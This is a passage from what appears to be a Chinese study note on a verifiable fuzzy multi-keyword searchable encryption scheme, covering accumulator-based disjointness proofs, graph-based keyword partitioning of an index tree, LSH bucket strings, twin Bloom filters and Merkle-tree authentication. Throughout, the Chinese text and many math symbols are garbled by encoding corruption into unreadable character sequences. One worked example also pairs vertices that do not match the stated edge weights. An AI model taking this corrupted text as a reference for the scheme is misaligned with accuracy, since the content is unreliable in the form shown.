$uâˆˆ\\mathbb{Z}^*_p$ ä½œä¸ºç§é’¥ $sk$ï¼Œç”Ÿæˆ $g^u$ ä½œä¸ºå…¬é’¥ $pk$\n\n> â·$Acc(T_i, sk)â†’acc_i$\n\nç»™å®šé›†åˆ $T_i$ï¼Œ$T_i$ çš„ç´¯ç§¯å€¼å¯è®¡ç®—ä¸º $acc_i=g^{P(T_i)}= g^{r_iâˆ_{tâˆˆT_i}(t+sk)}$ï¼Œå…¶ä¸­ $r_i$ æ˜¯ $\\Z^*_p$ ä¸­çš„ä¸€ä¸ªéšæœºå…ƒç´ \n\n> â¸$PDisjoint(P(T_1), P(T_2), pk)â†’Ï€$\n\nå¦‚æœ $T_1âˆ©T_2=\\varnothing$ï¼Œåˆ™å¯è®¡ç®—ä¸åŒ¹é…è¯æ˜ $Ï€= (pk^{Q_1}, pk^{Q_2})$ï¼Œæ ¹æ®æ‰©å±•æ¬§æ°ç®—æ³•ï¼Œ $Q_1$ã€$Q_2$ æ˜¯æ»¡è¶³ $P(T_1)Q_1+P(T_2)Q_2= 1$ çš„ä¸¤ä¸ªå¤šé¡¹å¼\n\n> â¹$VDisjoint(acc_1, acc_2, Ï€, sk)â†’\\{0,1\\}$\n\n$T_1âˆ©T_2=\\varnothing$ å½“ä¸”ä»…å½“ $e(acc_1, pk^{Q_1})Â·e(acc_2, pk^{Q_2}) =e(g,g)^{sk}$ æˆç«‹\n\n------\n\nè¯·æ³¨æ„ï¼ŒCSPæ— æ³•é€šè¿‡å¯†æ–‡$P(T_1)$è·å¾— $T_i$ å’Œ $sk$ã€‚å› æ­¤ï¼Œå®ƒä¸èƒ½é€šè¿‡ä¼ªé€ ç´¯ç§¯å€¼æ¥ä¼ªé€ ä¸åŒ¹é…è¯æ˜\n\n###  â“¹Graph-based keyword partition \n\n> ç´¢å¼•æ ‘ä¸­çš„æ–‡æ¡£åˆ†å¸ƒå¯¹æŸ¥è¯¢æ•ˆç‡æœ‰å¾ˆå¤§å½±å“ï¼Œå› ä¸ºä¸å·¦å³å­æ ‘éƒ½åŒ¹é…çš„å­æŸ¥è¯¢å°†å¯¼è‡´éå†ä¸¤ä¸ªå­æ ‘ã€‚å› æ­¤ï¼Œä½¿ç”¨åŸºäºå›¾çš„å…³é”®å­—åˆ’åˆ†ç®—æ³•(GKP)æ¥å°½å¯èƒ½å‡å°éå†å®½åº¦ï¼Œå…¶ä¸»è¦æ€æƒ³æ˜¯æœ€å°åŒ–å·¦å³ç´¢å¼•å­æ ‘ä¸­ç›¸åŒå…³é”®å­—çš„æ•°é‡\n\nå°†æ¯ä¸ªæ–‡æ¡£ $f_i$ ä½œä¸ºé¡¶ç‚¹ $v_i$ï¼Œä¸¤ä¸ªæ–‡æ¡£ $f_i, f_j$ ç›¸åŒå…³é”®è¯çš„ä¸ªæ•°ä¸º $v_i$ å’Œ $v_j$ ä¹‹é—´çš„è¾¹çš„æƒå€¼ $Ï‰_{i,j}$ï¼ŒDO æ„é€ äº†ä¸€ä¸ªåŠ æƒæ— å‘å›¾ G ã€‚ç„¶åï¼ŒDO æŒ‰ç…§ä¸‹å›¾çš„æ­¥éª¤å°† $G$ ä¸­çš„ $m$ ä¸ªé¡¶ç‚¹åˆå¹¶ä¸ºä¸¤ä¸ªé¡¶ç‚¹ã€‚ä¸ºäº†ä¿è¯ç´¢å¼•æ˜¯ä¸€ä¸ªå¹³è¡¡äºŒå‰æ ‘ï¼Œåªèƒ½åˆå¹¶ä¸¤ä¸ªé¡¶ç‚¹ $v_i$ , $v_j$ æ»¡è¶³ $|v_i|+|v_j|â‰¤âŒˆm/2âŒ‰$ï¼Œå…¶ä¸­ $|v_i|$ ä¸ºé¡¶ç‚¹ $v_i$ ä¸­åŒ…å«çš„æ–‡æ¡£æ•°é‡ã€‚\n\n![](https://img.jwt1399.top/img/202209292031824.png)\n\nåœ¨æ‰€æœ‰å¯åˆå¹¶çš„é¡¶ç‚¹å¯¹ä¸­ï¼ŒDOé¦–å…ˆé€‰æ‹©è¾¹æƒå€¼æœ€å¤§çš„å¯¹ ($v_i$ , $v_j$)ï¼Œç„¶åå°†å®ƒä»¬åˆå¹¶æˆä¸€ä¸ªæ–°çš„é¡¶ç‚¹ $v_Ï$ï¼Œæœ€åæ›´æ–°ä¸ä¹‹ç›¸è¿çš„æ¯æ¡è¾¹çš„æƒå€¼ï¼Œè¾¹æƒæ»¡è¶³ $Ï‰_{Ïï¼Œs}â‰¤Ï‰_{i,s}+Ï‰_{s,j}$ ã€‚åˆå¹¶è¿‡ç¨‹ä¸æ–­é‡å¤ï¼Œç›´åˆ°æ²¡æœ‰ä¸¤ä¸ªé¡¶ç‚¹å¯ä»¥åˆå¹¶ä¸ºæ­¢ã€‚åœ¨é‚£ä¹‹åï¼Œä¼šå‘ç”Ÿä¸¤ç§æƒ…å†µ\n\n- Case 1ï¼š\n\nç»“æœå›¾ä¸­åªå‰©ä¸‹ä¸¤ä¸ªé¡¶ç‚¹ã€‚DO å°†è¿™ä¸¤ä¸ªé¡¶ç‚¹ä½œä¸ºçš„ $root$ çš„å·¦å³å­æ ‘ï¼Œå¹¶å°†åŸºäºå›¾çš„å…³é”®å­—åˆ†åŒºç®—æ³•åˆ†åˆ«åº”ç”¨äºè¿™ä¸¤ä¸ªç‚¹ä¸­åŒ…å«çš„æ–‡æ¡£å­é›†\n\n- Case 2ï¼š\n\nç»“æœå›¾ä¸­è¿˜å‰©ä¸‹ä¸‰ä¸ªé¡¶ç‚¹ $v_{Ï„_1}, v_{Ï„_2}, v_{Ï„_3}$ ã€‚DO é¦–å…ˆæ‰¾å‡ºåŒ…å«æœ€å°‘æ–‡æ¡£æ•°é‡çš„é¡¶ç‚¹ï¼Œç„¶åå°†é¡¶ç‚¹ä¸­çš„æ‰€æœ‰æ–‡æ¡£é‡æ–°åˆ†é…åˆ°å…¶ä»–ä¸¤ä¸ªé¡¶ç‚¹ã€‚å…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬å‡è®¾ $|v_{Ï„_1}|â‰¥|v_{Ï„_2}|â‰¥|v_{Ï„_3}|$ã€‚å¯¹äºæ¯ä¸ªæ–‡æ¡£ $f_iâˆˆv_{Ï„_3}$, DO è®¡ç®—å®ƒä¸ $v_{Ï„_1}ã€v_{Ï„_2}$ç›¸åŒå…³é”®å­—çš„ä¸ªæ•° (è¡¨ç¤ºæƒé‡ $Ï‰_{i,Ï„_1}ï¼Œ Ï‰_{i,Ï„_2}$) ã€‚åœ¨æ‰€æœ‰è¿™äº›æƒé‡ä¸­ï¼ŒDO é€‰æ‹©äº†æœ€é«˜çš„ä¸€ä¸ªã€‚å‡è®¾æœ€å¤§æƒé‡ $Ï‰_{i,Ï„_1}$, DO æ¯”è¾ƒ $|v_{Ï„_1}|$ ä¸$âŒˆm/2âŒ‰$ã€‚å¦‚æœ $|v_{Ï„_1}|â‰¤âŒˆm/2âŒ‰$ï¼ŒDO å°† $f_i$ åˆå¹¶åˆ°$v_{Ï„_1}$ä¸­ï¼Œé‡æ–°è®¡ç®— $v_{Ï„_3}$ å’Œ $v_{Ï„_1}$ã€$v_{Ï„_2}$ ä¸­å„æ–‡æ¡£ä¹‹é—´çš„æ–°æƒé‡ï¼Œå¹¶é‡å¤è¿™ä¸ªé‡åˆ†é…è¿‡ç¨‹ã€‚å¦åˆ™ï¼ŒDOä¼šå°† $v_{Ï„_3}$ ä¸­çš„æ‰€æœ‰æ–‡æ¡£åˆå¹¶åˆ° $v_{Ï„_2}$ ä¸­ã€‚\n\nä¾‹å¦‚ï¼Œåœ¨ä¸Šå›¾ä¸­ï¼Œæˆ‘ä»¬æ³¨æ„åˆ° $v_7, v_8, v_9$ ä¸­çš„ä»»ä½•ä¸¤ä¸ªé¡¶ç‚¹éƒ½æ˜¯ä¸å¯åˆå¹¶çš„ï¼Œå› ä¸º$|v_7|=|v_8|=|v_9|= 2$ã€‚åœ¨ä¸ä¸§å¤±ä¸€èˆ¬æ€§çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å– $v_7$ ä¸ºåŒ…å«æ–‡æ¡£æ•°é‡æœ€å°‘çš„é¡¶ç‚¹ï¼Œå¹¶å‡è®¾ $v_7$ åŒ…å«æ–‡æ¡£ $f_1, f_2$ã€‚\n\nåœ¨ $f_i(i= 1,2)$ å’Œ $v_8, v_9$ ä¹‹é—´çš„æƒé‡ä¸­ï¼Œæˆ‘ä»¬å‘ç°æœ€é«˜çš„æƒé‡æ˜¯ $Ï‰_{2,9}= 3$ã€‚ç”±äº$|v_9|= 2<âŒˆ5/2âŒ‰$ä¿æŒä¸å˜ï¼Œæˆ‘ä»¬å°†$f_2$ åˆå¹¶åˆ° $v_9$ ä»¥ç”Ÿæˆæ–°çš„é¡¶ç‚¹ $v_{10}$ã€‚ä¹‹åï¼Œåœ¨é¡¶ç‚¹ $v_1ã€v_8ã€v_{10}$ ä¸­åˆ†åˆ«åŒ…å«1ã€2ã€3ä¸ªæ–‡æ¡£ã€‚è™½ç„¶æœ€é«˜æƒå€¼æ˜¯$Ï‰_{1,10}= 5$ï¼Œä½†æˆ‘ä»¬å°† $f_1$ åˆå¹¶åˆ° $v_8$ ä¸­ä»¥ç”Ÿæˆæ–°çš„é¡¶ç‚¹ $v_{11}$ï¼Œå› ä¸º$|v_{10}|=âŒˆ5/2âŒ‰$ã€‚\n\n------\n\nä¸¾ä¸ªğŸŒ°ï¼šä¸‹å›¾æ˜¯åŸºäºGKPçš„äº”ä¸ªæ–‡æ¡£ $\\{f_1ï¼Œf_2ï¼Œf_3ï¼Œf_4ï¼Œf_5\\}$ çš„ç´¢å¼•æ ‘æ„é€ ç¤ºä¾‹\n\n![](https://img.jwt1399.top/img/202209292030636.png)\n\n**æ­¥éª¤ä¸€ï¼š**é¡¶ç‚¹å¯¹ $(v_4, v_5)ï¼Œ(v_2, v_3)ï¼Œ(v_2, v_4)$ å…·æœ‰æœ€é«˜çš„è¾¹æƒ $Ï‰_{4,5}=Ï‰_{2,3}=Ï‰_{1,3}= 2$ï¼Œåœ¨ä¸ä¸§å¤±ä¸€èˆ¬æ€§çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆå¹¶ $v_4, v_5$ ä»¥è·å¾—ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ $v_6$ï¼Œ\n\n**æ­¥éª¤äºŒï¼š**ä¸ºç®€ä¾¿èµ·è§ï¼Œå‡è®¾ $Ï‰_{Ï,s}=Ï‰_{i,s}+Ï‰_{s,j}$ï¼Œé‡æ–°è®¡ç®—ä¸ $v_6$ ç›¸è¿çš„æ¯æ¡è¾¹çš„æƒå€¼\n$$\nÏ‰_{1,6}=Ï‰_{1,4} + Ï‰_{1,5} = 0+1= 1\n\\\\\nÏ‰_{2,6} =Ï‰_{2,4} +Ï‰_{2,5} =0+1= 1\n\\\\\nÏ‰_{3,6} =Ï‰_{3,4} +Ï‰_{3,5} =0+1= 1\n$$\nåœ¨æ–°çš„å›¾ä¸­ï¼Œæœ€å¤§è¾¹æƒå€¼æ˜¯ $Ï‰_{2,3}=Ï‰_{1,3}= 2$ï¼Œåœ¨ä¸ä¸§å¤±ä¸€èˆ¬æ€§çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬åˆå¹¶ $v_2, v_3$ å¾—åˆ°ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ $v_7$\n\n**æ­¥éª¤ä¸‰ï¼š**å½“å‰å›¾ç”± $v_1ã€v_6ã€v_7$ ä¸‰ä¸ªé¡¶ç‚¹ç»„æˆï¼Œåˆ†åˆ«åŒ…å«1ã€2ã€2ä¸ªæ–‡æ¡£ã€‚é‡æ–°è®¡ç®—æƒé‡\n$$\n|v_7|â‰¥|v_6|â‰¥|v_1|\n\\\\\nv_1=\\{f_1\\}=\\{w_1,w_3\\}\\\\\nv_6=\\{f_4,f_5\\}=\\{w_1,w_2,w_4\\}\\\\\nv_7=\\{f_2,f_3\\}=\\{w_1,w_3,w_5\\}\n\\\\\nÏ‰_{1,7}= 2ï¼Œ Ï‰_{6,7}= 1\n$$\nç”±äºæœ€é«˜è¾¹æƒå€¼æ˜¯ $Ï‰_{1,7}= 2$ å’Œ $|v_1|+|v_7|= 3â‰¤âŒˆ5/2âŒ‰$ï¼Œæˆ‘ä»¬åˆå¹¶ $v_1, v_7$ å¾—åˆ°ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ $v_8$\n\n**æ­¥éª¤å››ï¼š**æœ€åï¼Œæˆ‘ä»¬å°† $v_6ã€v_8$ ä½œä¸º $root$ çš„å·¦å³å­æ ‘æ¥æ„å»ºç´¢å¼•æ ‘ã€‚ä¸ºäº†ç”ŸæˆåŸºäº GKP çš„è®¤è¯ç´¢å¼•æ ‘ï¼Œæˆ‘ä»¬åªéœ€è¦å°† $Algorithms \\ 2$ ä¸­çš„ç¬¬8-9è¡Œæ›¿æ¢ä¸º $ID_l,ID_râ†GKP(ID)$\n\n## 3ã€æµç¨‹æ¦‚è¿°\n\n> æ–¹æ¡ˆè®¾è®¡äº†ä¸€ç§è‡ªé€‚åº”å®‰å…¨çš„æ¨¡ç³Šå¤šå…³é”®å­—æœç´¢æœºåˆ¶ã€‚å¯¹äºæ¯ä¸ªæ–‡æ¡£ï¼Œæˆ‘ä»¬é¦–å…ˆä½¿ç”¨LSHå‡½æ•°å°†æ‹¼å†™é”™è¯¯çš„å…³é”®å­—æ•£åˆ—åˆ°ç›¸åŒçš„ä½ç½®ï¼Œç„¶åè®¾è®¡ä¸€ä¸ªTBFæ¥å­˜å‚¨å’Œå±è”½è¿™äº›æ•£åˆ—å€¼ï¼Œä»¥åœ¨IND-CKA2æ¨¡å‹ä¸‹å®ç°éšç§ä¿æŠ¤çš„æ¨¡ç³Šå¤šå…³é”®å­—æœç´¢ã€‚åœ¨æŸ¥è¯¢é˜¶æ®µå®ç°äº†æ¯”çº¿æ€§æœç´¢å¤æ‚åº¦æ›´å¿«çš„æœç´¢ã€‚æˆ‘ä»¬å°†æ‰€æœ‰æ–‡æ¡£çš„TBFä½œä¸ºå¶èŠ‚ç‚¹æ¥æ„å»ºå¹³è¡¡ç´¢å¼•æ ‘ã€‚åœ¨æ„å»ºç´¢å¼•æ ‘æ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨åŸºäºå›¾çš„å…³é”®å­—åˆ’åˆ†ç®—æ³•æ¥æœ€å°åŒ–éå†å®½åº¦ï¼Œä»è€Œè¿›ä¸€æ­¥æé«˜æœç´¢æ•ˆç‡ã€‚æ–¹æ¡ˆå®ç°äº†æ­£ç¡®æ€§å’Œå®Œæ•´æ€§éªŒè¯ã€‚æˆ‘ä»¬é¦–å…ˆä½¿ç”¨è‡ªé€‚åº”çš„å¤šé›†ç´¯åŠ å™¨å¯¹æœªè¿”å›æ–‡æ¡£çš„ä¸ç›¸äº¤æ€§å’Œç›¸åº”çš„æŸ¥è¯¢å…³é”®å­—ç”Ÿæˆä¸åŒ¹é…è¯æ˜ï¼Œä»¥ç¡®ä¿ä¸ä¸¢å¤±æœ‰æ•ˆç»“æœï¼Œç„¶åé€šè¿‡MHTå¯¹ç´¢å¼•æ ‘è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»¥ç¡®ä¿ç´¢å¼•æ ‘ä¸­å­˜å‚¨çš„å†…å®¹ä¸è¢«ç¯¡æ”¹ã€‚\n\n- â“µé¦–å…ˆä¸ºæ¯ä¸ªæ–‡æ¡£å»ºç«‹ç´¢å¼•ï¼Œç„¶ååŸºäºè¿™äº›ç´¢å¼•æ„å»ºç´¢å¼•æ ‘ï¼Œæœ€åæ£€ç´¢åŒ…å«æ‰€æœ‰æŸ¥è¯¢å…³é”®å­—çš„æ–‡æ¡£ã€‚\n\n- â“¶å¯¹äºè‡ªé€‚åº”å®‰å…¨çš„æ¨¡ç³Šå¤šå…³é”®å­—æœç´¢ï¼Œæ¯ä¸ªæ–‡æ¡£çš„ç´¢å¼•æ˜¯ä¸€ä¸ª TBFï¼ŒåŒ…å«æ–‡æ¡£ä¸­çš„æ‰€æœ‰å…³é”®å­—ã€‚\n  - å…·ä½“æ¥è¯´ï¼Œæ–¹æ¡ˆé¦–å…ˆä½¿ç”¨ LSH å¤„ç†æ¯ä¸ªå…³é”®å­—ï¼Œè¿™æ ·æ‹¼å†™é”™è¯¯å’Œæ­£ç¡®çš„å…³é”®å­—å°±å¯ä»¥æ•£åˆ—åˆ°ç›¸åŒçš„ bucket ä¸­ã€‚\n  - ç„¶åï¼Œæ–¹æ¡ˆå°†è¿™äº›å…³é”®å­—çš„ bucket å€¼å­˜å‚¨å¹¶å±è”½åˆ° TBF ä¸­ï¼Œä»¥å®ç°è‡ªé€‚åº”å®‰å…¨ã€‚è¿™æ ·ï¼Œå°±ç”Ÿæˆäº†æ¯ä¸ªæ–‡æ¡£çš„ç´¢å¼•ã€‚\n\n- â“·å¯¹äºæ¯”çº¿æ€§æœç´¢å¤æ‚åº¦æ›´å¿«çš„æœç´¢ï¼Œæ–¹æ¡ˆé€šè¿‡å°†æ‰€æœ‰æ–‡æ¡£çš„ç´¢å¼•ä½œä¸ºå¶èŠ‚ç‚¹æ¥æ„å»ºä¸€ä¸ªå¹³è¡¡çš„äºŒå‰æ ‘ä½œä¸ºç´¢å¼•æ ‘ã€‚\n\n  - ç´¢å¼•æ ‘ä¸­çš„æ¯ä¸ªéå¶èŠ‚ç‚¹ä¹Ÿæ˜¯ä¸€ä¸ªTBFï¼Œç”±å…¶å­èŠ‚ç‚¹è¡¨ç¤ºçš„æ‰€æœ‰å…³é”®å­—çš„è”åˆæ„æˆã€‚\n  - å¦‚æœéå¶èŠ‚ç‚¹ä¸åŒ…å«æŸ¥è¯¢å…³é”®å­—ï¼Œåˆ™å…¶å­èŠ‚ç‚¹è‚¯å®šä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶ï¼Œå› æ­¤å¯ä»¥ä¿®å‰ªä»¥éå¶èŠ‚ç‚¹ä¸ºæ ¹çš„å­æ ‘ä¸­å­˜å‚¨çš„æ–‡æ¡£ï¼Œä»¥å®ç°æ¬¡çº¿æ€§æ£€ç´¢ã€‚\n  - æ­¤å¤–ï¼Œåœ¨ç´¢å¼•æ ‘çš„æ„å»ºä¸­ï¼Œè€ƒè™‘æ–‡æ¡£åˆ†å¸ƒå¯¹æ£€ç´¢æ•ˆç‡çš„å½±å“ï¼Œé‡‡ç”¨åŸºäºå›¾çš„å…³é”®å­—åˆ’åˆ†ç®—æ³•æ¥æœ€å°åŒ–å·¦å³ç´¢å¼•å­æ ‘ä¸­ç›¸åŒå…³é”®å­—çš„æ•°é‡ï¼Œä»¥è¿›ä¸€æ­¥æé«˜æ£€ç´¢æ•ˆç‡ã€‚\n\n- â“¸ä¸ºäº†è¿›è¡Œæ­£ç¡®æ€§å’Œå®Œæ•´æ€§éªŒè¯ï¼Œé¦–å…ˆä½¿ç”¨ MSA å¯¹æœªè¿”å›æ–‡æ¡£çš„ä¸ç›¸äº¤æ€§å’Œç›¸åº”çš„æŸ¥è¯¢å…³é”®å­—ç”Ÿæˆä¸åŒ¹é…è¯æ˜ï¼Œä»¥ç¡®ä¿ä¸ä¸¢å¤±æœ‰æ•ˆç»“æœï¼›ç„¶åé€šè¿‡MHTå¯¹ç´¢å¼•æ ‘è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä»¥ç¡®ä¿ç´¢å¼•æ ‘ä¸­å­˜å‚¨çš„å†…å®¹ä¸è¢«ç¯¡æ”¹ã€‚\n\n  - é¦–å…ˆæ–¹æ¡ˆè¿è¡Œ $MSA.Acc$ åˆ†åˆ«è®¡ç®—æ¯ä¸ªæ ‘èŠ‚ç‚¹å’Œæ¯ä¸ªæŸ¥è¯¢å…³é”®å­—çš„ç´¯ç§¯å€¼\n\n  - å¦‚æœæ ‘èŠ‚ç‚¹ä¸åŒ…å«æŸä¸ªæŸ¥è¯¢å…³é”®å­—ï¼Œåˆ™æ–¹æ¡ˆè¿è¡Œ $MSA.PDisjoint$ ç”Ÿæˆä¸€ä¸ªä¸åŒ¹é…è¯æ˜è¡¨ç¤ºå®ƒä»¬çš„ä¸ç›¸äº¤ã€‚\n\n  - åœ¨ä¸åŒ¹é…è¯æ˜çš„å¸®åŠ©ä¸‹ï¼ŒQU è¿è¡Œ$MSA.VDisjoint$ï¼ŒéªŒè¯æœªè¿”å›çš„æ–‡æ¡£æ˜¯å¦ç¡®å®ä¸æ»¡è¶³æŸ¥è¯¢æ¡ä»¶ï¼Œä»¥ç¡®ä¿æ²¡æœ‰é—æ¼æœ‰æ•ˆç»“æœã€‚\n\n  - ä½¿ç”¨ MSA æ¥éªŒè¯æœç´¢ç»“æœçš„å®Œæ•´æ€§çš„å‰ææ˜¯ç´¢å¼•æ ‘è¢«å®Œæ•´åœ°å­˜å‚¨ï¼Œæ²¡æœ‰è¢«ç¯¡æ”¹ï¼Œè¿™æ˜¯ç”± MHT æ¥ä¿è¯çš„ã€‚\n  - æ–¹æ¡ˆæ ¹æ® MHT å¯¹å­˜å‚¨åœ¨æ¯ä¸ªæ ‘èŠ‚ç‚¹ä¸­çš„å†…å®¹è¿›è¡Œæ•£åˆ—ã€‚ root digest é‡‡ç”¨æ•°å­—ç­¾åæŠ€æœ¯è¿›è¡Œç­¾åï¼Œä»¥é˜²æ­¢è¢«ç¯¡æ”¹ã€‚\n\n  - å¦‚æœåŸå§‹ root digest ç­‰äºåŸºäºè¾…åŠ©è¯æ˜ä¿¡æ¯é‡æ–°è®¡ç®—çš„ root digestï¼Œåˆ™ç´¢å¼•æ ‘æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚è¿™æ ·ï¼Œå®ç°äº†å¯¹æœç´¢ç»“æœçš„æ­£ç¡®æ€§å’Œå®Œæ•´æ€§çš„éªŒè¯ã€‚\n\n## 4ã€å…·ä½“å®ç°\n\n### **â¶KeyGen**\n\n> $KeyGen(1^Î», k)â†’ \\{PP, SK\\}$\n\n- â“µDOé¦–å…ˆè¿è¡Œ $MSA.KGenâ†’\\{pk, sk\\}$ï¼Œç”¨äºç»“æœéªŒè¯\n\n- â“¶å†ç”Ÿæˆä¸€å¯¹å…¬ç§å¯¹ ${K_{pub}, K_{pri}}$ ï¼Œç”¨äºæ•°å­—ç­¾å\n- â“·å†è¿è¡Œ  $TBF.Setup$ è¾“å‡º $H_{key}$ å’Œ $H$\n- â“¸å†ç”Ÿæˆä¸€ä¸ªé”®æ§å“ˆå¸Œå‡½æ•° $H_1 : \\{0,1\\}^âˆ—Ã— \\{0,1\\}^Î»â†’ \\mathbb{Z}_p$\n- â“¹å†éšæœºç”Ÿæˆä¼ ç»Ÿçš„æŠ—ç¢°æ’å“ˆå¸Œ $H_2 : \\{0,1\\}^âˆ—â†’ \\{0,1\\}^Î»$\n\nDO æœ€ç»ˆè¾“å‡º $PP=\\{pk, K_{pub}, H, H_2\\},$ $SK=\\{sk,K_{pri},H_{key}, H_1\\}$\n\n### **â·IndexGen**\n\n> $IndexGen(F, N, PP, SK)â†’I$\n>\n\nä»æ–‡æ¡£ $F = \\{f_1,Â·Â·Â·, f_m\\}$ ä¸­é‡‡ç”¨ *Porter Stemming Algorithm* æå–å…³é”®è¯ $W=\\{w_1, w_2,Â·Â·Â·\\}$ï¼›DO é€šè¿‡ $Algorithms \\ 1,2$ ç”Ÿæˆç»è¿‡èº«ä»½éªŒè¯çš„ç´¢å¼•æ ‘\n\n| ![](https://img.jwt1399.top/img/202209281433785.png) | ![](https://img.jwt1399.top/img/202209281722510.png) |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n\n| Fuzzy setting  & adaptive encryption                 | Index tree  &  AuthenticatioÂ©f                       |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202209261409397.png) | ![](https://img.jwt1399.top/img/202209261409241.png) |\n\n#### â“µFuzzy setting\n\n- 160 uni-gram vector $\\vec{v_j}$\n- LSH familyï¼š $ \\{h_{a_Î¹,b_Î¹}\\}^n_{Î¹=1}$\n  \n\n$$\nS_j=h_{a_1,b_1}(\\vec{v_j})||Â·Â·Â·||h_{a_n,b_n}(\\vec{v_j})\n$$\n\n------\n\nä¸¾ä¸ªğŸŒ°ï¼šå°†å•è¯ â€œsecureâ€ æ”¾å…¥ uni-gram é›†åˆ\n\n- 1.é¦–å…ˆåˆ†ç‰‡ï¼š $\\{s1ï¼Œe1ï¼Œc1ï¼Œu1ï¼Œr1ï¼Œe2\\}$\n\n- 2.è®¡ç®—ä½ç½®ï¼š$\\{19,5,3,21,18,26+5\\}$ \n\n- 3.è®¾ç½®å€¼ï¼šå¯¹åº”ä½ç½®è®¾ä¸º1ï¼Œå…¶ä»–ä½ç½®è®¾ç½®ä¸º0ï¼Œç”Ÿæˆ160ç»´ uni-gram é›†åˆ\n\n- 4.æ˜ å°„åˆ°Bucketï¼šä½¿ç”¨ 3 ä¸ª LSH $\\{h_{a_1,b_1}ï¼Œh_{a_2,b_2}ï¼Œh_{a_3,b_3}\\}$ï¼Œå°† $\\vec{v_j}$ æ•£åˆ—ä¸º 3 ä¸ªå“ˆå¸Œå€¼ï¼Œå¦‚ $s_1ï¼Œs_2ï¼Œs_3$ï¼Œå¹¶ç”Ÿæˆ Bucket String $S=s_1||s_2||s_3$\n\n- å‡è®¾æ–‡æ¡£åŒ…å«ä¸‰ä¸ªå…³é”®å­—ï¼Œæˆ‘ä»¬å°†ç›¸åº”çš„ 3 ä¸ª Bucket String æ˜ å°„åˆ° TBF $B_i$\n\n<font color=\"#f0f\"><b>æ¸©é¦¨æç¤º</b></font>ï¼šuni-gram å‘é‡çš„é•¿åº¦å’Œ LSH å‡½æ•°çš„æ•°é‡å¯ä»¥æ ¹æ® DO çš„éœ€è¦æ”¹å˜ã€‚\n\n------\n\n#### â“¶Adaptive encryption\n\n- DO è¿è¡Œ $TBF.Initi$ ç”Ÿæˆé•¿åº¦ä¸º N çš„ TBF $B_i$\n\n- å†è¿è¡Œ $TBF.Insert$ å°† Bucket String  $S_j$ æ˜ å°„åˆ° $B_i$\n  $$\n  B_i[h_1(S_j)],Â·Â·Â·, B_i[h_k(S_j)]\n  $$\n\n- å†ç”Ÿæˆ $tag$  $t_j=H_1(h_1(S_j)||Â·Â·Â·||h_k(S_j))$\n- $T_i $ ç”± $f_i$ æ‰€åŒ…å«çš„å…³é”®å­—çš„æ‰€æœ‰æ ‡ç­¾ç»„æˆï¼Œç”¨äºç¨åç”Ÿæˆç´¯ç§¯å€¼\n\n------\n\n#### â“·Index tree construction\n\nä¸ºäº†å®ç°äºšçº¿æ€§æ£€ç´¢ï¼ŒDO å°†æ‰€æœ‰æ–‡æ¡£çš„ TBF ä½œä¸ºå¶èŠ‚ç‚¹æ¥æ„é€ å¹³è¡¡çš„äºŒè¿›åˆ¶ç´¢å¼•æ ‘ï¼Œç´¢å¼•æ ‘ä¸­çš„æ¯ä¸ªéå¶èŠ‚ç‚¹ä¹Ÿæ˜¯ä¸€ä¸ª n ç»´ TBFï¼Œç”±å…¶å­èŠ‚ç‚¹è¡¨ç¤ºçš„æ‰€æœ‰å…³é”®å­—é›†çš„å¹¶é›†æ„é€ è€Œæˆã€‚\n\n- è®¾ $B_l$ å’Œ $B_r$ æ˜¯å­˜å‚¨åœ¨èŠ‚ç‚¹ $L_f$ çš„å·¦å³å­èŠ‚ç‚¹ä¸­çš„ä¸¤ä¸ª TBF ï¼Œå­˜å‚¨åœ¨èŠ‚ç‚¹ $L_f$ ä¸­çš„ TBF $B_f$ æ„é€ å¦‚ä¸‹ï¼š\n\n$$\nB_f = B_l âˆ¨ B_r\n\\\\\\\\\nB_f[Î¹][H(h_{k+1}(Î¹)âŠ•Î³_f)] =B_l[Î¹][H(h_{k+1}(Î¹)âŠ•Î³_l)]âˆ¨B_r[Î¹][H(h_{k+1}(Î¹)âŠ•Î³_r)]\n\\\\\\\\\\\nB_f[Î¹][1âˆ’H(h_{k+1}(Î¹)âŠ•Î³_f)] = 1âˆ’B_f[Î¹][H(h_{k+1}(Î¹)âŠ•Î³_f)]\n$$\n\n------\n\n#### â“¸Authentication\n\nDOä½¿ç”¨ MSA å’Œ MHT éªŒè¯ç´¢å¼•æ ‘ï¼Œå¦‚ä¸‹æ‰€ç¤º\n\n- 1.å¯¹äºè¡¨ç¤ºæ¯ä¸ªæ–‡æ¡£ $f_i$ çš„å¶èŠ‚ç‚¹ï¼ŒDO ç”Ÿæˆä¸€ä¸ªç´¯ç§¯å€¼ $acc_i$ å’Œä¸€ä¸ªæ‘˜è¦ $d_i$\n\n$$\nacc_i=MSA.Acc(T_i, sk)\n\\\\\\\\\nd_i=H_2(c_i||B_i||acc_i)\n$$\n\n~~å…¶ä¸­å¯†æ–‡$c_i$æ˜¯é€šè¿‡æ ‡å‡†åŠ å¯†ç®—æ³•ï¼ˆå¦‚AESï¼‰åŠ å¯†æ–‡æ¡£è€Œç”Ÿæˆçš„~~\n\n- 2.å¯¹äºæ¯ä¸ªéå¶èŠ‚ç‚¹ $L_f$ï¼ŒDO ç”Ÿæˆä¸€ä¸ªç´¯ç§¯å€¼  $acc_f$ å’Œä¸€ä¸ªæ‘˜è¦ $d_f$\n\n$$\nacc_f=MSA.Acc(T_f, sk)\n\\\\\\\\\nd_f=H_2(H_2(d_l||d_r)||B_f||acc_f)\n$$\n\n~~å…¶ä¸­ $T_f$ æ˜¯å…¶å­èŠ‚ç‚¹ $tag$ é›†çš„å¹¶é›†($T_f=T_lâˆªT_r$)ã€‚$d_l$ï¼Œ$d_r$ æ˜¯å…¶å·¦å³å­èŠ‚ç‚¹çš„æ‘˜è¦~~\n\n- 3.è®¡ç®— root 